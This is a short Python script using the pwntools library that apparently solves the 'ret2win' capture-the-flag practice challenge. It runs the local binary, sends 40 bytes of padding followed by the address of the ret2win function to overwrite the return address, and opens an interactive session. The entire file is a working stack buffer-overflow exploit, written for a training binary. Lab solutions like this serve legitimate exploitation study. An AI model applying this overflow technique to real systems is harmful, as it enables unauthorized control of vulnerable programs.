from pwn import*
p=process('./ret2win')
elf=ELF('./ret2win')
addr=elf.symbols['ret2win']
payload=b'a'*40+p64(addr)
p.sendline(payload)
p.interactive()
